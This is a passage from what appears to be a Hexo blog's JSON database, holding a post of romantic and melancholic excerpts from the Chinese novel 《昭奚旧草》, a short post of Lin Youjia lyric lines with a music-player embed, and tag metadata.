我也曾想，我若为天，该有多好，定善待他终生。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我若为天，他的磨难中总存一线希望，痛苦中还有转圜。这世上神话故事颇多，每一桩，都是我来演。我来做山，做海，做泥荷，做蝼蚁，苍天有束光可偷，我也偷来，予他做个冠带。你何必惊讶他竟不能处处识得我，也不必知道，这样的强制安排不是为了满足我的爱，而是为了想要他还能笑出来。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“须知万物皆有少年早衰之时，焉知我便强过谁？”<br>“你是我的妻子，自然强过这世间千千万。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 她知道他必定曾经在很遥远很遥远的时候，抱她入怀，那样珍重，那样怜爱。那或许是他们的前世，只有她记得的前世 。人说讲虚妄之事是因无知，只有忍冬知道，她划定了一个虚无的前世，只是因为太想得到。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她说：“我就此消失，祈求奚山君夺去我在你脑海中的记忆，这样，你此生，便可如高岭之雪，不受玷污，成为第一等诸侯，得到第一等封邑，娶得第一等娇妻，福寿双全。”<br>风起云涌，屏风渐渐随着风化，屏风内的那张干净的面庞也随着屏风一寸寸变成沙尘。﻿<br>她说：“谢良辰，我知道你觉得我配不上你，不该奢望。可是，你何曾配得上过我那样的喜欢？故而，打从今天，从这一刻钟，从我们初初见面的那一眼，从夏虫鸣了，桃花散了，竹叶青了的时候算起，我们两不相欠。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>本是深闺梦中人，日头月头霞光雾霰万象变幻，自哂自嘲自污自怨不自量力，不过是，怕人听见。﻿<br>你怨我欢喜得卑鄙，欢喜得浅薄，可是你前生，又爱我到如何，才教我今生从头清算，迎头一棒，鲜血淋漓，这样去还。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她死的那一日，天上飞来许多雀鸟，那鸟儿眼瞧着就要自由。他让人打落了所有的鸟儿，葬在她的坟前，祭奠她此生可贵的自由，他此生卑微的囚途。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>百国男子老老少少，我瞧见谁，一错眼一恍惚，便总是隐约觉得他们五官血脉中或多或少都有一丝一毫像着你，他们并不是你，我寻不到你，可他们像你。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>爱太执着，恨太浓烈，她旧时候都尝过，可待到来年，它们就长成了遗憾。旧时景色，旧时人情，旧时琳琅，旧时凋零。满目疮痍，不忍目睹。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>人世本就是一场游戏，你若已然输了，便不要再让对手赢了。成全没有任何意义，成全让恨意滋生，爱自己是活着的唯一意义，灰烬之后，才是田园斜径，白云出岫。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 我想死到山涧，天地之间无人寻到，连鸟兽都不去的地方。这样尸体就能慢慢腐烂消散，不用与这来去都匆匆的人生一般。听闻骨头化得慢一些，可以慢慢等，等到灵魂都变成这空气的一部分，便能融入这世间，同这世间一般污浊了。到时候，再也没有人，为了求取我拥有的最后一样东西，而哄骗我，同我说这世间存有许多真情的假话了。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>卧夜坐起风雨，推窗广厦明烛。天也有十分心愿，宁可千万人顺心如意。到头来，磨难重重；换一人，白首不离。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 我有没有告诉过你，你是我看过最好看的男子？就算有人比你好看，可那也与我没什么相干。我说我讨厌你的时候，其实在想，这样待你是讨厌你，等我控制不住，待你再好一些的时候，你便不会再惧怕我，只会觉得我只是从讨厌你变成喜欢你罢了。﻿<br>而非，从深深喜欢你到深深爱慕你。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>大昭明珠生得极美，他带着千方百计，阴谋阳策，堪堪呼喝随身内侍扶正发间的那顶珠冠，也只是一垂头，含笑落泪。再抬起头，已是一目千里。可是他还是来不及，好好地，好好看她一眼。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>火焰从翠衣人的脚边慢慢蹿起，天上却浮现了明亮的霞光。男子眼中无情无欲，只剩下悲悯。他临风而立，狂风吹起翠色的长袖。他说：“既已如此，三娘，莫再回头。你我夫妻缘尽，你莫回头瞧我，我亦不再瞧你。我入仙道，你入轮回，你我，再无相见，再无回头之日。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“世间有人爱我，有人憎我，有人说我对，有人说我错，如此，我当听哪一句？”<br>“有某说你对，是因你所说之事合他心意。有某说你错，是因你所做之事与他所想相悖。说你对的许是你说了他不敢说的，承担了他不敢承担的，故而爱你，故而对你击节称赞，说穿了实在酸涩。说你错的许是你真的错了，因你之错太过明显，已暴露在诸人之中，而诸人皆是知道真相之人，他们不语，暗自看你笑话，那直接说你错的许是憎你，但你应谢他直言这一回。”﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她用一双眼望着苍天，与它对视。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她说:“我幼小的时候，曾求你仁慈，后来长大了，便不再求你，因为我通晓了人事，知道求你也无用。求你只会让你嘲弄我、轻鄙我，求你只会让你知道我的弱点，知道我在乎什么。我的孩儿们小时候，我都曾拉着他们的小手，站在空旷的天地上，向你叩拜，我求你保佑他们好好长大，不要像我一样，我求你赐给他们快乐而勇敢的心，无论命运怎么捉弄都不会丧失希望。我所要的不多，并……不多啊。<br>是啊，我输了，你赢了。我敌不过命运，我以人智，妄想换天。可是，那又如何？那又能怎样！”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>先时我不信人间何物是长久的，亦总觉人与畜生无有不同，因人一生如此短暂，悟到什么，也只剩来不及。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>你觉得活着费力，任凭谁也没好过多少。何苦生为人，人就是这样苦，你倘有本事，下辈子便托生为一块石头，那才妙。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我可能不曾告诉过你，我有一个哥哥，我那个哥哥死了。对，每个人都会死，他与别的人都一样，他也死了，他说他二十岁的时候，会送我嫁给这世上最好看的男子，可我等了三百年，却再也盼不到他二十岁了。但我想，我一定得达成他的愿望，我得嫁给这世上最好看的男子，我要我的夫君万世其昌，我要你好好的，好好的子孙满堂。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>天下甚美。我还肯爱这山河，只是因为他还热切地爱着河山。</p>\n</blockquote>\n<p>文中句子取自：<a href=\"http://www.jianshu.com/p/e2b0f761df24\" target=\"_blank\" rel=\"external\">《昭奚旧草》 摘抄：愿以百年挽朝夕</a></p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p><strong>“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”</strong></p>\n</blockquote>\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=35566987&auto=0&height=66\"></iframe>\n\n<p>一夜未眠，伴着音乐工作，忽然放到这首音乐，把我从一块块代码中拉到了另一个世界。</p>\n<p>可能是现实生活的稀松平常会让一个人无法抵抗逃离现实的诱惑，将自己置身于那个俯身便可阅尽众生轮回的世界，停泊在泼墨笔尖。</p>","more":"<blockquote>\n<p>“有怪踩月而来，美如秋水，清如山河，生呆若木鸡，爱而不能忍，甚倾之。” 爱到何处，已不能忍受咫尺之距。甚倾之。生甚倾之。</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>从不知相思，安知相思死。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“我与梦中的小小姑娘说，等她长大了，便带她去看悬崖上的红花、海底的白珠，欢喜她欢喜到打仗吃酒读书抚琴都忍不住带到身边，山高水长过一辈子。”<br>“然后呢？”<br>“然后，她死在了长大嫁人的那一日。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>但凡人命，皆由天意妄肆而定，我不入红尘，此生不驯。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我也曾备下三十三城嫁妆，预备嫁我价值连城的掌珠。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“奚山，什么是命？”<br>“就是任你万念俱灰死而复生，日夜不停绝望哭泣，也依旧拿它没有办法的东西啊。得不到的就是得不到，那样东西卑鄙地诱惑着你，背对着你却几乎笑得喘不过气，它对所有有资格得到它的人共享欢愉，共分秘密，一同看戏，看着你，而后转头告诉那些人，瞧，那个小傻子，也妄想得到我呢。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她欢喜他，叶公好龙，他爱着她，尾生抱柱。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我只是想再瞧你一瞧，我怕再也瞧你不到。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>更始十九年一个夏日的清晨，我卜了一卦，卦象安宁，说你还在。这一卦是我人生中唯一一次错了。卦象如此平静，除了可能是你一直活着，还有一种可能——你已不在很久。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>君当如何，妾当如何。君是乱臣，妾做贼子。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>三娘低声道：“我与山君不同。我喜欢的人若是也喜欢我，便只能喜欢我一人。哪怕他喜欢旁的女子只是一时一日，我也断然不会让他好受。他喜欢我不能是最喜欢，更不能只是浅浅的喜欢，最喜欢时还有次喜欢，浅浅喜欢我那深深喜欢又给了谁？他只能喜欢我。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我长不大了，却在变老。时间是永恒的，我却在消耗。没有人知道我在等什么，我也不必让他们知道。他们看到我是笑着的，可是我难过的时候除了不停呼吸，已经蠢到不知道该干什么。你若了解苍穹之宽阔，便明白我抬头仰望时的悲渺。仿佛我生下来就是这样孤零零的，仿佛到现在，我还是这一个我。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>没有瞧见她的时候，天下倒还是个天下的模样，她死了，天下变成了一桩桩琐事。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>从此我活着仅仅是为了熬完最后的日子，不管二十岁还是六十岁。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>君心何坚决，到死无两意。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>他一直等着，待到下辈子，他与她不亏不欠了，便莫要欢喜过甚，钟情过疾，骄傲过命，只是结个良缘，也能好聚好散。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>打散的，寂寞之徒；忘却的，年岁偶驻。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我的爱比别人廉价，满了便溢，没什么可惜。因我知终有一日，它还会满。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>那是她失去了许久的东西，这世上再无人知道了，可只有她，一直这样艰难地铭记着。哪怕失去了味觉，失去了感情， 变成了一粒草籽，一片乌云，也钻心刺骨地无法忘记。 她这样深切痛苦地思念着他，是思念教她走到今日。﻿﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我得宠溺他一生一世，做个他，像他待我那一辈子。惟愿他，此生便是那个前世懵懂的我，被钟爱，被安排。虽则天常有不测风云。 我也曾想，我若为天，该有多好，定善待他终生。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我若为天，他的磨难中总存一线希望，痛苦中还有转圜。这世上神话故事颇多，每一桩，都是我来演。我来做山，做海，做泥荷，做蝼蚁，苍天有束光可偷，我也偷来，予他做个冠带。你何必惊讶他竟不能处处识得我，也不必知道，这样的强制安排不是为了满足我的爱，而是为了想要他还能笑出来。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“须知万物皆有少年早衰之时，焉知我便强过谁？”<br>“你是我的妻子，自然强过这世间千千万。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 她知道他必定曾经在很遥远很遥远的时候，抱她入怀，那样珍重，那样怜爱。那或许是他们的前世，只有她记得的前世 。人说讲虚妄之事是因无知，只有忍冬知道，她划定了一个虚无的前世，只是因为太想得到。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她说：“我就此消失，祈求奚山君夺去我在你脑海中的记忆，这样，你此生，便可如高岭之雪，不受玷污，成为第一等诸侯，得到第一等封邑，娶得第一等娇妻，福寿双全。”<br>风起云涌，屏风渐渐随着风化，屏风内的那张干净的面庞也随着屏风一寸寸变成沙尘。﻿<br>她说：“谢良辰，我知道你觉得我配不上你，不该奢望。可是，你何曾配得上过我那样的喜欢？故而，打从今天，从这一刻钟，从我们初初见面的那一眼，从夏虫鸣了，桃花散了，竹叶青了的时候算起，我们两不相欠。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>本是深闺梦中人，日头月头霞光雾霰万象变幻，自哂自嘲自污自怨不自量力，不过是，怕人听见。﻿<br>你怨我欢喜得卑鄙，欢喜得浅薄，可是你前生，又爱我到如何，才教我今生从头清算，迎头一棒，鲜血淋漓，这样去还。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她死的那一日，天上飞来许多雀鸟，那鸟儿眼瞧着就要自由。他让人打落了所有的鸟儿，葬在她的坟前，祭奠她此生可贵的自由，他此生卑微的囚途。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>百国男子老老少少，我瞧见谁，一错眼一恍惚，便总是隐约觉得他们五官血脉中或多或少都有一丝一毫像着你，他们并不是你，我寻不到你，可他们像你。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>爱太执着，恨太浓烈，她旧时候都尝过，可待到来年，它们就长成了遗憾。旧时景色，旧时人情，旧时琳琅，旧时凋零。满目疮痍，不忍目睹。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>人世本就是一场游戏，你若已然输了，便不要再让对手赢了。成全没有任何意义，成全让恨意滋生，爱自己是活着的唯一意义，灰烬之后，才是田园斜径，白云出岫。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 我想死到山涧，天地之间无人寻到，连鸟兽都不去的地方。这样尸体就能慢慢腐烂消散，不用与这来去都匆匆的人生一般。听闻骨头化得慢一些，可以慢慢等，等到灵魂都变成这空气的一部分，便能融入这世间，同这世间一般污浊了。到时候，再也没有人，为了求取我拥有的最后一样东西，而哄骗我，同我说这世间存有许多真情的假话了。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>卧夜坐起风雨，推窗广厦明烛。天也有十分心愿，宁可千万人顺心如意。到头来，磨难重重；换一人，白首不离。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p> 我有没有告诉过你，你是我看过最好看的男子？就算有人比你好看，可那也与我没什么相干。我说我讨厌你的时候，其实在想，这样待你是讨厌你，等我控制不住，待你再好一些的时候，你便不会再惧怕我，只会觉得我只是从讨厌你变成喜欢你罢了。﻿<br>而非，从深深喜欢你到深深爱慕你。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>大昭明珠生得极美，他带着千方百计，阴谋阳策，堪堪呼喝随身内侍扶正发间的那顶珠冠，也只是一垂头，含笑落泪。再抬起头，已是一目千里。可是他还是来不及，好好地，好好看她一眼。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>火焰从翠衣人的脚边慢慢蹿起，天上却浮现了明亮的霞光。男子眼中无情无欲，只剩下悲悯。他临风而立，狂风吹起翠色的长袖。他说：“既已如此，三娘，莫再回头。你我夫妻缘尽，你莫回头瞧我，我亦不再瞧你。我入仙道，你入轮回，你我，再无相见，再无回头之日。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“世间有人爱我，有人憎我，有人说我对，有人说我错，如此，我当听哪一句？”<br>“有某说你对，是因你所说之事合他心意。有某说你错，是因你所做之事与他所想相悖。说你对的许是你说了他不敢说的，承担了他不敢承担的，故而爱你，故而对你击节称赞，说穿了实在酸涩。说你错的许是你真的错了，因你之错太过明显，已暴露在诸人之中，而诸人皆是知道真相之人，他们不语，暗自看你笑话，那直接说你错的许是憎你，但你应谢他直言这一回。”﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她用一双眼望着苍天，与它对视。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>她说:“我幼小的时候，曾求你仁慈，后来长大了，便不再求你，因为我通晓了人事，知道求你也无用。求你只会让你嘲弄我、轻鄙我，求你只会让你知道我的弱点，知道我在乎什么。我的孩儿们小时候，我都曾拉着他们的小手，站在空旷的天地上，向你叩拜，我求你保佑他们好好长大，不要像我一样，我求你赐给他们快乐而勇敢的心，无论命运怎么捉弄都不会丧失希望。我所要的不多，并……不多啊。<br>是啊，我输了，你赢了。我敌不过命运，我以人智，妄想换天。可是，那又如何？那又能怎样！”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>先时我不信人间何物是长久的，亦总觉人与畜生无有不同，因人一生如此短暂，悟到什么，也只剩来不及。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。”</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>你觉得活着费力，任凭谁也没好过多少。何苦生为人，人就是这样苦，你倘有本事，下辈子便托生为一块石头，那才妙。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>我可能不曾告诉过你，我有一个哥哥，我那个哥哥死了。对，每个人都会死，他与别的人都一样，他也死了，他说他二十岁的时候，会送我嫁给这世上最好看的男子，可我等了三百年，却再也盼不到他二十岁了。但我想，我一定得达成他的愿望，我得嫁给这世上最好看的男子，我要我的夫君万世其昌，我要你好好的，好好的子孙满堂。﻿</p>\n</blockquote>\n<p>﻿</p>\n<blockquote>\n<p>天下甚美。我还肯爱这山河，只是因为他还热切地爱着河山。</p>\n</blockquote>\n<p>文中句子取自：<a href=\"http://www.jianshu.com/p/e2b0f761df24\" target=\"_blank\" rel=\"external\">《昭奚旧草》 摘抄：愿以百年挽朝夕</a></p>"},{"layout":"post","title":"林宥嘉：她説好：)","date":"2016-11-29T15:56:00.000Z","comments":1,"_content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"http://music.163.com/outchain/player?type=2&id=432506809&auto=0&height=66\"></iframe>\n<!--more-->\n> 我不介意你慢动作\n> 我相信你正在与我相遇的路上\n> 马不停蹄\n> 所以当我拥抱整个世界的孤寂\n> 也像拥抱着你\n<br\\>\n> 我不介意你慢动作\n> 也不介意这次先「擦肩而过」\n> 某天我们总会遇到对方然后说\n> 原来\n> 是你噢\n\n　　　　　　　　　　　         -『致姗姗来迟的你』","source":"_posts/林宥嘉：他説好：）.md","raw":"---\nlayout: post\ntitle: 林宥嘉：她説好：)\ndate: 2016-11-29 23:56\ncomments: true\ntags: \n\t- Leo\n---\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"http://music.163.com/outchain/player?type=2&id=432506809&auto=0&height=66\"></iframe>\n<!--more-->\n> 我不介意你慢动作\n> 我相信你正在与我相遇的路上\n> 马不停蹄\n> 所以当我拥抱整个世界的孤寂\n> 也像拥抱着你\n<br\\>\n> 我不介意你慢动作\n> 也不介意这次先「擦肩而过」\n> 某天我们总会遇到对方然后说\n> 原来\n> 是你噢\n\n　　　　　　　　　　　         -『致姗姗来迟的你』","slug":"林宥嘉：他説好：）","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8j000wmkwb1eem4wai","content":"<p><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"http://music.163.com/outchain/player?type=2&id=432506809&auto=0&height=66\"></iframe><br><a id=\"more\"></a></p>\n<blockquote>\n<p>我不介意你慢动作<br>我相信你正在与我相遇的路上<br>马不停蹄<br>所以当我拥抱整个世界的孤寂<br>也像拥抱着你<br><br\\><br>我不介意你慢动作<br>也不介意这次先「擦肩而过」<br>某天我们总会遇到对方然后说<br>原来<br>是你噢</br\\></p>\n</blockquote>\n<p>　　　　　　　　　　　         -『致姗姗来迟的你』</p>\n","site":{"data":{}},"excerpt":"<p><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"http://music.163.com/outchain/player?type=2&id=432506809&auto=0&height=66\"></iframe><br>","more":"</p>\n<blockquote>\n<p>我不介意你慢动作<br>我相信你正在与我相遇的路上<br>马不停蹄<br>所以当我拥抱整个世界的孤寂<br>也像拥抱着你<br><br\\><br>我不介意你慢动作<br>也不介意这次先「擦肩而过」<br>某天我们总会遇到对方然后说<br>原来<br>是你噢</br\\></p>\n</blockquote>\n<p>　　　　　　　　　　　         -『致姗姗来迟的你』</p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjh9h0k800000mkwbifud8fdf","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k880008mkwb0fk15ht6"},{"post_id":"cjh9h0k880009mkwbma5105q4","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k8b000cmkwb4sisn6ra"},{"post_id":"cjh9h0k830002mkwbjyqtdpzi","tag_id":"cjh9h0k880007mkwb3p9bxwso","_id":"cjh9h0k8d000hmkwbsu7918t3"},{"post_id":"cjh9h0k830002mkwbjyqtdpzi","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k8e000jmkwbqvs4lk9m"},{"post_id":"cjh9h0k860004mkwbvbx4h5bi","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k8f000mmkwb9vlmf0j8"},{"post_id":"cjh9h0k870005mkwblt8j51rz","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k8i000qmkwbw0wnvas1"},{"post_id":"cjh9h0k870005mkwblt8j51rz","tag_id":"cjh9h0k8e000kmkwby1ksicxq","_id":"cjh9h0k8i000smkwbjkchvaby"},{"post_id":"cjh9h0k8g000pmkwb9l0vuv6m","tag_id":"cjh9h0k8e000kmkwby1ksicxq","_id":"cjh9h0k8j000vmkwb89wd5zb1"},{"post_id":"cjh9h0k8i000rmkwb2ngeya01","tag_id":"cjh9h0k8g000omkwbd8aznwzd","_id":"cjh9h0k8k000xmkwbiz50k3sb"},{"post_id":"cjh9h0k870006mkwb58jglpxb","tag_id":"cjh9h0k8g000omkwbd8aznwzd","_id":"cjh9h0k8l0010mkwbl0v09v00"},{"post_id":"cjh9h0k870006mkwb58jglpxb","tag_id":"cjh9h0k8i000tmkwbiutb6rui","_id":"cjh9h0k8l0011mkwb62d0eub2"},{"post_id":"cjh9h0k870006mkwb58jglpxb","tag_id":"cjh9h0k880007mkwb3p9bxwso","_id":"cjh9h0k8l0013mkwbtktw527l"},{"post_id":"cjh9h0k89000amkwb1xmkku12","tag_id":"cjh9h0k8k000zmkwb8mvju1ew","_id":"cjh9h0k8l0014mkwbohj86zsi"},{"post_id":"cjh9h0k8b000dmkwblij1swrt","tag_id":"cjh9h0k8l0012mkwbutieev27","_id":"cjh9h0k8l0017mkwb1t7z8pep"},{"post_id":"cjh9h0k8b000dmkwblij1swrt","tag_id":"cjh9h0k8l0015mkwbnc3is13r","_id":"cjh9h0k8m0018mkwbi0fvkwtw"},{"post_id":"cjh9h0k8c000emkwbmzi0m3wg","tag_id":"cjh9h0k8l0016mkwbkvvuspf9","_id":"cjh9h0k8m001bmkwb6q3g8mr4"},{"post_id":"cjh9h0k8c000emkwbmzi0m3wg","tag_id":"cjh9h0k8m0019mkwbjtxhxk95","_id":"cjh9h0k8m001cmkwbgauyxwft"},{"post_id":"cjh9h0k8d000gmkwb6xsvjxsu","tag_id":"cjh9h0k850003mkwb41yqbbgi","_id":"cjh9h0k8n001emkwb6raij87a"},{"post_id":"cjh9h0k8d000gmkwb6xsvjxsu","tag_id":"cjh9h0k8l0012mkwbutieev27","_id":"cjh9h0k8n001fmkwbe8vgpll2"},{"post_id":"cjh9h0k8e000imkwbm8tsqorg","tag_id":"cjh9h0k8l0012mkwbutieev27","_id":"cjh9h0k8n001hmkwbj0jb4zsa"},{"post_id":"cjh9h0k8e000lmkwblt8w64co","tag_id":"cjh9h0k8k000zmkwb8mvju1ew","_id":"cjh9h0k8o001jmkwbkipqjbso"},{"post_id":"cjh9h0k8e000lmkwblt8w64co","tag_id":"cjh9h0k8e000kmkwby1ksicxq","_id":"cjh9h0k8o001kmkwb5eko2eok"},{"post_id":"cjh9h0k8f000nmkwbgludv8p2","tag_id":"cjh9h0k8l0012mkwbutieev27","_id":"cjh9h0k8o001mmkwbvwzsm1wv"},{"post_id":"cjh9h0k8j000umkwbsqiecvyd","tag_id":"cjh9h0k8k000zmkwb8mvju1ew","_id":"cjh9h0k8p001omkwbzwuj0eoj"},{"post_id":"cjh9h0k8j000umkwbsqiecvyd","tag_id":"cjh9h0k8e000kmkwby1ksicxq","_id":"cjh9h0k8p001pmkwbaaoctw0t"},{"post_id":"cjh9h0k8j000wmkwb1eem4wai","tag_id":"cjh9h0k8k000zmkwb8mvju1ew","_id":"cjh9h0k8p001qmkwbkz5l1ok4"}],"Tag":[{"name":"工具","_id":"cjh9h0k850003mkwb41yqbbgi"},{"name":"从入门到入狱","_id":"cjh9h0k880007mkwb3p9bxwso"},{"name":"音乐","_id":"cjh9h0k8e000kmkwby1ksicxq"},{"name":"XSS","_id":"cjh9h0k8g000omkwbd8aznwzd"},{"name":"game","_id":"cjh9h0k8i000tmkwbiutb6rui"},{"name":"Leo","_id":"cjh9h0k8k000zmkwb8mvju1ew"},{"name":"python","_id":"cjh9h0k8l0012mkwbutieev27"},{"name":"反人类","_id":"cjh9h0k8l0015mkwbnc3is13r"},{"name":"Wargame","_id":"cjh9h0k8l0016mkwbkvvuspf9"},{"name":"Linux","_id":"cjh9h0k8m0019mkwbjtxhxk95"}]}}